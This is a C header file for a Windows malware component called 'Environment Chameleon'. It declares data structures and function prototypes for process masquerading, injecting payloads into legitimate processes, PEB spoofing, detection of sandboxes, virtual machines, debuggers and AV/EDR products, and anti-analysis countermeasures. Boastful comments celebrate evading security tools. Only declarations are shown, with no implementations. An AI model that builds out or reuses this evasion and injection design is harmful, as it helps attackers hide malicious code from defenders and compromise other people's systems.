#ifndef ENVIRONMENT_CHAMELEON_H
#define ENVIRONMENT_CHAMELEON_H

#include "common_defines.h"

// ========================================================================
// ENVIRONMENT CHAMELEON v1.0 - "Boss Level Process Masquerading"
// "When you're so good at hiding, even Task Manager gets confused" - Real G
// ========================================================================

// Process masquerading targets - ranked by stealth level
typedef struct _MASQUERADE_TARGET {
    WCHAR process_name[64];        // Process executable name
    WCHAR process_path[MAX_PATH];  // Full path to masquerade location
    WCHAR process_args[256];       // Command line arguments to mimic
    DWORD stealth_score;           // Higher = more invisible (0-100)
    DWORD performance_cost;        // Lower = faster execution (0-100)
    BOOL requires_elevation;       // Need admin rights?
    BOOL requires_specific_user;   // Need specific user context?
    DWORD min_windows_version;     // Minimum Windows version (0x0601 = Win7)
    DWORD process_category;        // Category flags
} MASQUERADE_TARGET, *PMASQUERADE_TARGET;

// Process categories for intelligent selection
#define PROC_CAT_SYSTEM         0x00000001  // System processes (svchost, dwm)
#define PROC_CAT_SECURITY       0x00000002  // Security software (AV/EDR)
#define PROC_CAT_BROWSER        0x00000004  // Web browsers
#define PROC_CAT_OFFICE         0x00000008  // Office applications
#define PROC_CAT_CLOUD          0x00000010  // Cloud services (OneDrive, Dropbox)
#define PROC_CAT_MEDIA          0x00000020  // Media applications
#define PROC_CAT_DEVELOPMENT    0x00000040  // Dev tools
#define PROC_CAT_GAMING         0x00000080  // Gaming platforms

// Environment detection results
typedef struct _ENVIRONMENT_PROFILE {
    // Basic system info
    DWORD windows_version;         // Windows version
    DWORD windows_build;           // Build number
    BOOL is_wow64;                 // Running under WoW64?
    BOOL is_elevated;              // Running as admin?
    
    // Security landscape
    DWORD detected_av_count;       // Number of AV products
    DWORD detected_edr_count;      // Number of EDR products
    WCHAR primary_av[64];          // Main AV product name
    WCHAR primary_edr[64];         // Main EDR product name
    
    // Virtualization/Sandbox detection
    BOOL is_virtual_machine;       // VM detected?
    BOOL is_sandbox;               // Sandbox detected?
    BOOL is_analysis_env;          // Analysis environment?
    WCHAR vm_product[64];          // VM product if detected
    
    // Process environment
    DWORD running_processes;       // Total process count
    DWORD suspicious_processes;    // Suspicious process count
    BOOL has_debugger;             // Debugger attached?
    BOOL has_monitoring;           // Process monitoring detected?
    
    // User environment
    WCHAR username[64];            // Current username
    WCHAR computer_name[64];       // Computer name
    BOOL is_domain_joined;         // Domain environment?
    DWORD user_activity_score;     // How active is the user? (0-100)
    
    // Optimal masquerade selection
    PMASQUERADE_TARGET best_target;        // Best masquerade target
    DWORD confidence_score;                // Confidence in selection (0-100)
} ENVIRONMENT_PROFILE, *PENVIRONMENT_PROFILE;

// Masquerading context
typedef struct _CHAMELEON_CONTEXT {
    ENVIRONMENT_PROFILE env_profile;
    MASQUERADE_TARGET current_target;
    HANDLE original_process;
    HANDLE masqueraded_process;
    BOOL is_masquerading;
    DWORD masquerade_start_time;
    DWORD last_update_time;
} CHAMELEON_CONTEXT, *PCHAMELEON_CONTEXT;

// Global chameleon instance
extern CHAMELEON_CONTEXT g_chameleon_ctx;

// ========================================================================
// BOSS-LEVEL API - "Stealth so good, it's illegal in 12 countries"
// ========================================================================

// Initialize the Environment Chameleon system
BOOL Chameleon_Initialize(VOID);

// Analyze current environment and build profile
NTSTATUS Chameleon_AnalyzeEnvironment(PENVIRONMENT_PROFILE profile);

// Select optimal masquerade target based on environment
PMASQUERADE_TARGET Chameleon_SelectOptimalTarget(PENVIRONMENT_PROFILE profile, DWORD preferences);

// Execute process masquerading
NTSTATUS Chameleon_ExecuteMasquerade(PMASQUERADE_TARGET target);

// Update masquerade if environment changes
NTSTATUS Chameleon_UpdateMasquerade(VOID);

// Clean up and restore original identity
VOID Chameleon_Cleanup(VOID);

// ========================================================================
// DETECTION FUNCTIONS - "Know your enemy before you become invisible"
// ========================================================================

// Detect virtualization/sandbox environment
BOOL Chameleon_DetectVirtualization(PWCHAR vm_product, SIZE_T buffer_size);

// Detect security products (AV/EDR)
DWORD Chameleon_DetectSecurityProducts(PWCHAR av_list, PWCHAR edr_list, SIZE_T buffer_size);

// Detect analysis/debugging environment
BOOL Chameleon_DetectAnalysisEnvironment(VOID);

// Detect user activity patterns
DWORD Chameleon_AnalyzeUserActivity(VOID);

// ========================================================================
// MASQUERADING FUNCTIONS - "Become the process you want to see in Task Manager"
// ========================================================================

// Create masqueraded process with spoofed identity
NTSTATUS Chameleon_CreateMasqueradeProcess(
    PMASQUERADE_TARGET target,
    PVOID payload_data,
    SIZE_T payload_size,
    PHANDLE process_handle
);

// Inject into existing legitimate process
NTSTATUS Chameleon_InjectIntoLegitimateProcess(
    LPCWSTR target_process,
    PVOID payload_data,
    SIZE_T payload_size
);

// Spoof process information in PEB
NTSTATUS Chameleon_SpoofProcessInformation(
    HANDLE process_handle,
    PMASQUERADE_TARGET target
);

// ========================================================================
// UTILITY FUNCTIONS - "The devil is in the details"
// ========================================================================

// Get list of running processes with details
DWORD Chameleon_EnumerateProcesses(PVOID buffer, SIZE_T buffer_size);

// Check if process name is suspicious
BOOL Chameleon_IsProcessSuspicious(LPCWSTR process_name);

// Calculate stealth score for a target
DWORD Chameleon_CalculateStealthScore(PMASQUERADE_TARGET target, PENVIRONMENT_PROFILE env);

// Validate masquerade target compatibility
BOOL Chameleon_ValidateTarget(PMASQUERADE_TARGET target, PENVIRONMENT_PROFILE env);

// ========================================================================
// PREDEFINED MASQUERADE TARGETS - "The Greatest Hits Collection"
// ========================================================================

// Get predefined target by category
PMASQUERADE_TARGET Chameleon_GetTargetByCategory(DWORD category, PENVIRONMENT_PROFILE env);

// Get all available targets
DWORD Chameleon_GetAllTargets(PMASQUERADE_TARGET* targets, DWORD max_count);

// ========================================================================
// LOGGING INTEGRATION - "Document your invisibility"
// ========================================================================

// Log masquerading attempt
VOID Chameleon_LogMasqueradeAttempt(PMASQUERADE_TARGET target, NTSTATUS result);

// Log environment analysis results
VOID Chameleon_LogEnvironmentAnalysis(PENVIRONMENT_PROFILE profile);

// Log detection events
VOID Chameleon_LogDetectionEvent(LPCSTR event_type, LPCSTR details, BOOL is_threat);

// ========================================================================
// ADVANCED FEATURES - "Boss mode activated"
// ========================================================================

// Dynamic target selection based on real-time analysis
PMASQUERADE_TARGET Chameleon_DynamicTargetSelection(VOID);

// Adaptive masquerading - change identity based on threats
NTSTATUS Chameleon_AdaptiveMasquerade(DWORD threat_level);

// Anti-analysis countermeasures
VOID Chameleon_DeployCountermeasures(VOID);

// Self-assessment of masquerade effectiveness
DWORD Chameleon_AssessMasqueradeEffectiveness(VOID);

#endif // ENVIRONMENT_CHAMELEON_H 